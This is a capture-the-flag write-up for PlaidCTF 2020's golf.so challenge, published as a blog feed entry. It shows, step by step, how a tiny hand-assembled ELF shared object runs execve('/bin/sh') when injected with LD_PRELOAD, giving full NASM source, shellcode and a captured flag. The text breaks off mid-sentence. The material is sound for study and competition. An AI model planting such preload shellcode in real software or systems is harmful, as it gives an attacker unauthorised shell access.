    <title>[Misc] PCTF2020 - golf.so</title>
    <link href="https://teamrocketist.github.io/2020/04/20/Misc-PCTF2020-golf-so/"/>
    <id>https://teamrocketist.github.io/2020/04/20/Misc-PCTF2020-golf-so/</id>
    <published>2020-04-20T12:04:00.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Golf.so<br><strong>Solves</strong>: 104</p><p><strong>Points</strong>: 500   </p><p><strong>Description</strong>:<br> Upload a 64-bit ELF shared object of size at most 1024 bytes. It should spawn a shell (execute execve(“/bin/sh”, [“/bin/sh”], …)) when used like<br>LD_PRELOAD=<upload> /bin/true</upload></p><p>golf.so.pwni.ng</p></blockquote><p>The objective of this challenge is to create an ELF shared library that when running like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ LD_PRELOAD=&lt;upload&gt; /bin/<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>It would spawn a shell, there is also a requirement the shared library must be less than 1024 bytes to pass the first level. The first thing I tried to do is to use the classic gcc.</p><p>First I look up at the binary <strong>/bin/true</strong> with ghidra and It looks like <strong>/bin/true</strong> automaticly exists if the arguments are less than 2 so our option is to either overwrite the <strong>entry point</strong> or <strong>_libc_start_main</strong>.</p><p>After searching online for the function signature of _libc_start_main I wrote this c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(</span><br><span class="line">  <span class="keyword">void</span> *func_ptr,</span><br><span class="line">  <span class="keyword">int</span> argc,</span><br><span class="line">  <span class="keyword">char</span>* argv[],</span><br><span class="line">  <span class="keyword">void</span> (*init_func)(<span class="keyword">void</span>),</span><br><span class="line">  <span class="keyword">void</span> (*fini_func)(<span class="keyword">void</span>),</span><br><span class="line">  <span class="keyword">void</span> (*rtld_fini_func)(<span class="keyword">void</span>),</span><br><span class="line">  <span class="keyword">void</span> *stack_end)&#123;</span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">"/bin/sh"</span>,<span class="number">0x0</span>&#125;;</span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>, args, <span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Compiling it using <strong>gcc</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared lol.c -o lol.so</span><br><span class="line">$ LD_PRELOAD=./lol.so /bin/<span class="literal">true</span></span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><p>We got a shell but unfortunately the file is too big:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ltah lol.so</span><br><span class="line">-rwxr-xr-x 1 root root 16K Apr 20 10:08 lol.so*</span><br></pre></td></tr></table></figure><p><strong>16k</strong> is a lot and we need to find a way to reduce its size… After some reading on the man page of <strong>gcc</strong> and some recomendations online I tried to use the following gcc options: </p><ul><li><strong>norelro</strong> compile option.</li><li>Stripping the binary.</li><li>Activate no start files option for gcc.</li><li>nodefault libraries.</li><li>Turning on optimizations with -O3</li></ul><p>This reduced the file size by a considerable amount:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -shared -nostartfiles -nodefaultlibs -shared -Wl,-z,norelro -s lol.c -O3</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rwxr-xr-x 1 root root 9.5K Apr 20 10:13 a.out</span><br></pre></td></tr></table></figure><p>And <strong>9.5k</strong> was the max I could get by just using <strong>gcc</strong>, we need less than 1k. After this I found this <a href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html" target="_blank" rel="noopener">post</a> online about a creating tiny elf binaries by constructing the binary by hand using <strong>assembly</strong>. Perhaps the post is for <strong>elfs</strong> of the type <strong>ET_EXEC</strong> and we need <strong>ET_DYN</strong> also the did that for 32 bits we need 64. The possible file types of an <strong>ELF</strong> are:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ET_NONE         An unknown type.     (0x0)</span><br><span class="line">ET_REL          A relocatable file.  (0x1)</span><br><span class="line">ET_EXEC         An executable file.  (0x2)</span><br><span class="line">ET_DYN          A shared object.     (0x3)</span><br><span class="line">ET_CORE         A core file.         (0x4)</span><br></pre></td></tr></table></figure><p>We want <strong>ET_DYN</strong> a shared object, so after some smart searching on github for examples of shared objects in assembly I found this <a href="https://github.com/Capa-cc/metasploit-framework/blob/e36f5602cbeec9c91a74fcdc81c82c795f0e151e/data/templates/src/elf/dll/elf_dll_x64_template.s" target="_blank" rel="noopener">template</a>, the string I used to find this was: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db    0x7f, &quot;ELF&quot; ET_DYN</span><br></pre></td></tr></table></figure><p>We can straight up modify the <strong>_start</strong> label which is the entry point present in the dynamic section, to open a shell we need to execute the syscall <strong>execve</strong> we need to updated the registers <strong>RAX</strong> to 0x3b, <strong>RDI</strong> to a pointer to the string <strong>/bin/sh</strong> and <strong>RSI</strong> to a pointer to an array <strong>[“/bin/sh”,0x0]</strong>. My first shell code was:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">mov rdi,0x68732f6e69622f ; /bin/sh to RDI</span><br><span class="line">push rdi ; push /bin/sh to the stack</span><br><span class="line">push rsp ; push current stack pointer to the stack</span><br><span class="line">pop rdi ; put the pointer of /bin/sh to RDI</span><br><span class="line">push 59 ; push 0x3b to the stack</span><br><span class="line">pop rax ; get 0x3b from the stack to RAX</span><br><span class="line">push 0 ; constructing the the finaly argument of the array</span><br><span class="line">push rdi ; push a pointer of /bin/sh to the stack</span><br><span class="line">mov rsi,rsp ; put a pointer to [&quot;/bin/sh&quot;,0x0] to RSI</span><br><span class="line">cdq ; Convert Doubleword to Quadword https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq</span><br><span class="line">syscall ; execve(&quot;/bin/sh&quot;,[&quot;/bin/sh&quot;,0x0],0x0)</span><br></pre></td></tr></table></figure><p>Putting this code in the template:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; build with:</span><br><span class="line">;   nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.bin</span><br><span class="line"></span><br><span class="line">BITS 64</span><br><span class="line">org     0</span><br><span class="line">ehdr:</span><br><span class="line">  db    0x7f, &quot;ELF&quot;, 2, 1, 1, 0    ; e_ident</span><br><span class="line">  db    0, 0, 0, 0,  0, 0, 0, 0</span><br><span class="line">  dw    3                          ; e_type    = ET_DYN</span><br><span class="line">  dw    62                         ; e_machine = EM_X86_64</span><br><span class="line">  dd    1                          ; e_version = EV_CURRENT</span><br><span class="line">  dq    _start                     ; e_entry   = _start</span><br><span class="line">  dq    phdr - $$                  ; e_phoff</span><br><span class="line">  dd    shdr - $$                  ; e_shoff</span><br><span class="line">  dq    0                          ; e_flags</span><br><span class="line">  dw    ehdrsize                   ; e_ehsize</span><br><span class="line">  dw    phdrsize                   ; e_phentsize</span><br><span class="line">  dw    2                          ; e_phnum</span><br><span class="line">  dw    shentsize                  ; e_shentsize</span><br><span class="line">  dw    2                          ; e_shnum</span><br><span class="line">  dw    1                          ; e_shstrndx</span><br><span class="line">ehdrsize equ  $ - ehdr</span><br><span class="line"></span><br><span class="line">phdr:</span><br><span class="line">  dd    1                          ; p_type   = PT_LOAD</span><br><span class="line">  dd    7                          ; p_flags  = rwx</span><br><span class="line">  dq    0                          ; p_offset</span><br><span class="line">  dq    $$                         ; p_vaddr</span><br><span class="line">  dq    $$                         ; p_paddr</span><br><span class="line">  dq    0xDEADBEEF                 ; p_filesz</span><br><span class="line">  dq    0xDEADBEEF                 ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">phdrsize equ  $ - phdr</span><br><span class="line">  dd    2                          ; p_type  = PT_DYNAMIC</span><br><span class="line">  dd    7                          ; p_flags = rwx</span><br><span class="line">  dq    dynsection                 ; p_offset</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">  dq    dynsz                      ; p_filesz</span><br><span class="line">  dq    dynsz                      ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line"></span><br><span class="line">shdr:</span><br><span class="line">  dd    1                          ; sh_name</span><br><span class="line">  dd    6                          ; sh_type = SHT_DYNAMIC</span><br><span class="line">  dq    0                          ; sh_flags</span><br><span class="line">  dq    dynsection                 ; sh_addr</span><br><span class="line">  dq    dynsection                 ; sh_offset</span><br><span class="line">  dq    dynsz                      ; sh_size</span><br><span class="line">  dd    0                          ; sh_link</span><br><span class="line">  dd    0                          ; sh_info</span><br><span class="line">  dq    8                          ; sh_addralign</span><br><span class="line">  dq    7                          ; sh_entsize</span><br><span class="line">shentsize equ $ - shdr</span><br><span class="line">  dd    0                          ; sh_name</span><br><span class="line">  dd    3                          ; sh_type = SHT_STRTAB</span><br><span class="line">  dq    0                          ; sh_flags</span><br><span class="line">  dq    strtab                     ; sh_addr</span><br><span class="line">  dq    strtab                     ; sh_offset</span><br><span class="line">  dq    strtabsz                   ; sh_size</span><br><span class="line">  dd    0                          ; sh_link</span><br><span class="line">  dd    0                          ; sh_info</span><br><span class="line">  dq    0                          ; sh_addralign</span><br><span class="line">  dq    0                          ; sh_entsize</span><br><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_STRSZ</span><br><span class="line">  dq    0x0a</span><br><span class="line">  dq    0</span><br><span class="line">; DT_SYMENT</span><br><span class="line">  dq    0x0b</span><br><span class="line">  dq    0</span><br><span class="line">; DT_NULL</span><br><span class="line">  dq    0x00</span><br><span class="line">  dq    0</span><br><span class="line">dynsz equ $ - dynsection</span><br><span class="line"></span><br><span class="line">strtab:</span><br><span class="line"> db 0</span><br><span class="line"> db 0</span><br><span class="line">strtabsz equ $ - strtab</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">;db 0xcc</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Compiling it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out full.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 root root 427 Apr 20 11:28 a.out</span><br><span class="line">$ nasm -f bin -o a.out full.asm</span><br><span class="line">$ LD_PRELOAD=./a.out ./<span class="literal">true</span></span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>So with this we got a shared file with 427 bytes! more than half of the asked 1024 bytes, so lets upload in the site:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You made it to level 1: considerable! You have 127 bytes left to be thoughtful. This effort is worthy of 0/2 flags.</span><br></pre></td></tr></table></figure><p>So this effort as expected is not enough for a flag, we need to save at least more 127 bytes for the first flag. What I did next was to remove unnecessary sections from the elf something that would not broke the binary.The first thing I did was to remove the <strong>Section header</strong> (shdr). </p><p>Its not really required, so the changes done to <strong>full.asm</strong> were: </p><ul><li><strong>e_shoff</strong> in the <strong>elf header</strong>(ehdr) to point to the <strong>program header</strong> (phdr)</li><li><strong>e_shentsize</strong> in the <strong>elf header</strong>(ehdr) value to zero</li><li><strong>e_shnum</strong> in the <strong>elf header</strong>(ehdr) value to zero (the number of section headers set to zero because we completly removed this section)</li></ul><p>The full script to <strong>cuted.asm</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; build with:</span><br><span class="line">;   nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.bin</span><br><span class="line"></span><br><span class="line">BITS 64</span><br><span class="line">org     0</span><br><span class="line">ehdr:</span><br><span class="line">  db    0x7f, &quot;ELF&quot;, 2, 1, 1, 0    ; e_ident</span><br><span class="line">  db    0, 0, 0, 0,  0, 0, 0, 0</span><br><span class="line">  dw    3                          ; e_type    = ET_DYN</span><br><span class="line">  dw    62                         ; e_machine = EM_X86_64</span><br><span class="line">  dd    1                          ; e_version = EV_CURRENT</span><br><span class="line">  dq    _start                     ; e_entry   = _start</span><br><span class="line">  dq    phdr - $$                  ; e_phoff</span><br><span class="line">  dd    phdr - $$                  ; e_shoff (chaged to phdr instead of shdr)</span><br><span class="line">  dq    0                          ; e_flags</span><br><span class="line">  dw    ehdrsize                   ; e_ehsize</span><br><span class="line">  dw    phdrsize                   ; e_phentsize</span><br><span class="line">  dw    2                          ; e_phnum</span><br><span class="line">  dw    0                          ; e_shentsize (changed to 0)</span><br><span class="line">  dw    0                          ; e_shnum (changed to 0)</span><br><span class="line">  dw    1                          ; e_shstrndx</span><br><span class="line">ehdrsize equ  $ - ehdr</span><br><span class="line"></span><br><span class="line">phdr:</span><br><span class="line">  dd    1                          ; p_type   = PT_LOAD</span><br><span class="line">  dd    7                          ; p_flags  = rwx</span><br><span class="line">  dq    0                          ; p_offset</span><br><span class="line">  dq    $$                         ; p_vaddr</span><br><span class="line">  dq    $$                         ; p_paddr</span><br><span class="line">  dq    0xDEADBEEF                 ; p_filesz</span><br><span class="line">  dq    0xDEADBEEF                 ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">phdrsize equ  $ - phdr</span><br><span class="line">  dd    2                          ; p_type  = PT_DYNAMIC</span><br><span class="line">  dd    7                          ; p_flags = rwx</span><br><span class="line">  dq    dynsection                 ; p_offset</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">  dq    dynsz                      ; p_filesz</span><br><span class="line">  dq    dynsz                      ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">; shdr header removed here</span><br><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_STRSZ</span><br><span class="line">  dq    0x0a</span><br><span class="line">  dq    0</span><br><span class="line">; DT_SYMENT</span><br><span class="line">  dq    0x0b</span><br><span class="line">  dq    0</span><br><span class="line">; DT_NULL</span><br><span class="line">  dq    0x00</span><br><span class="line">  dq    0</span><br><span class="line">dynsz equ $ - dynsection</span><br><span class="line"></span><br><span class="line">strtab:</span><br><span class="line"> db 0</span><br><span class="line"> db 0</span><br><span class="line">strtabsz equ $ - strtab</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">;db 0xcc</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>This was enough to get us the first flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">You made it to level 2: thoughtful! </span><br><span class="line">You have 75 bytes left to be hand-crafted. </span><br><span class="line">This effort is worthy of 1/2 flags. </span><br><span class="line">PCTF&#123;th0ugh_wE_have_cl1mBed_far_we_MusT_St1ll_c0ntinue_oNward&#125;</span><br></pre></td></tr></table></figure></p><p>A lot of improvements can be done after this for example we have a lot of unnecessary entries in the dynamic section like <strong>DT_NULL</strong>, <strong>DT_SYMENT</strong> and <strong>DT_STRSZ</strong>. We can remove that a save a lot of bytes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...truncated...</span><br><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    strtab</span><br><span class="line">dynsz equ $ - dynsection</span><br><span class="line"></span><br><span class="line">strtab:</span><br><span class="line"> db 0</span><br><span class="line"> db 0</span><br><span class="line">strtabsz equ $ - strtab</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">;db 0xcc</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out cuted.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 evilgod evilgod 251 Apr 20 11:58 a.out</span><br></pre></td></tr></table></figure><p>We reduced to 251 bytes, still far from obtaining the necessary 194 for the 2nd flag. More improvements can be done for example we can cut the last 3 fields of the elf header, which are related to the the section header that we previously removed (e_shentsize, e_shnum and e_shstrndx).</p><p>With that we saved up 6 bytes, another way to save even more bytes is to cut the last fields of the <strong>PT_DYNAMIC</strong> entry from the <strong>program header(phdr)</strong> fortunelly this won’t break the lib, in the end this entry will <strong>overlap</strong> with the <strong>dynamic section</strong> which is perfectly fine. So the next fields to remove are <strong>p_vaddr,p_filesz,p_memsz,p_align</strong>.</p><p>The assembly file looks like this right now:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; build with:</span><br><span class="line">;   nasm elf_dll_x64_template.s -f bin -o template_x64_linux_dll.bin</span><br><span class="line"></span><br><span class="line">BITS 64</span><br><span class="line">org     0</span><br><span class="line">ehdr:</span><br><span class="line">  db    0x7f, &quot;ELF&quot;, 2, 1, 1, 0    ; e_ident</span><br><span class="line">  db    0, 0, 0, 0,  0, 0, 0, 0</span><br><span class="line">  dw    3                          ; e_type    = ET_DYN</span><br><span class="line">  dw    62                         ; e_machine = EM_X86_64</span><br><span class="line">  dd    1                          ; e_version = EV_CURRENT</span><br><span class="line">  dq    _start                     ; e_entry   = _start</span><br><span class="line">  dq    phdr - $$                  ; e_phoff</span><br><span class="line">  dd    phdr - $$                  ; e_shoff (chaged to phdr instead of shdr)</span><br><span class="line">  dq    0                          ; e_flags</span><br><span class="line">  dw    ehdrsize                   ; e_ehsize</span><br><span class="line">  dw    phdrsize                   ; e_phentsize</span><br><span class="line">  dw    2                          ; e_phnum</span><br><span class="line">ehdrsize equ  $ - ehdr</span><br><span class="line"></span><br><span class="line">phdr:</span><br><span class="line">  dd    1                          ; p_type   = PT_LOAD</span><br><span class="line">  dd    7                          ; p_flags  = rwx</span><br><span class="line">  dq    0                          ; p_offset</span><br><span class="line">  dq    $$                         ; p_vaddr</span><br><span class="line">  dq    $$                         ; p_paddr</span><br><span class="line">  dq    0xDEADBEEF                 ; p_filesz</span><br><span class="line">  dq    0xDEADBEEF                 ; p_memsz</span><br><span class="line">  dq    0x1000                     ; p_align</span><br><span class="line">phdrsize equ  $ - phdr</span><br><span class="line">  dd    2                          ; p_type  = PT_DYNAMIC</span><br><span class="line">  dd    7                          ; p_flags = rwx</span><br><span class="line">  dq    dynsection                 ; p_offset</span><br><span class="line">  dq    dynsection                 ; p_vaddr</span><br><span class="line">dynsection:</span><br><span class="line">; DT_INIT</span><br><span class="line">  dq    0x0c</span><br><span class="line">  dq    _start</span><br><span class="line">; DT_STRTAB</span><br><span class="line">  dq    0x05</span><br><span class="line">  dq    strtab</span><br><span class="line">; DT_SYMTAB</span><br><span class="line">  dq    0x06</span><br><span class="line">  dq    strtab</span><br><span class="line">dynsz equ $ - dynsection</span><br><span class="line"></span><br><span class="line">strtab:</span><br><span class="line"> db 0</span><br><span class="line"> db 0</span><br><span class="line">strtabsz equ $ - strtab</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">;db 0xcc</span><br><span class="line">mov rdi,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">push 59</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">cdq</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>Compiling it we can see we got this into to a file of size 213 bytes:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f bin -o a.out cuted.asm</span><br><span class="line">$ ls -ltah a.out</span><br><span class="line">-rw-r--r-- 1 root root 213 Apr 20 12:13 a.out</span><br></pre></td></tr></table></figure></p><p>Still not enough for the final flag, we still need to save <strong>19 bytes</strong>, so the next step for me is to optimize the shell code at start, we have some fields we can controll without breaking the binary so the next step for me was to include the <strong>/bin/sh</strong> string in this kind of fields so we don’t require to put it in the stack and manipulate those pointers. This can save use some bytes.</p><p>I saved the <strong>/bin/sh</strong> string in the <strong>p_filesz</strong> field of the <strong>PT_LOAD</strong> entry in the <strong>program header</strong>.<br>One thing that helped me a lot while debugging a shell was to put a <strong>int 3</strong> instruction before my shell code, this 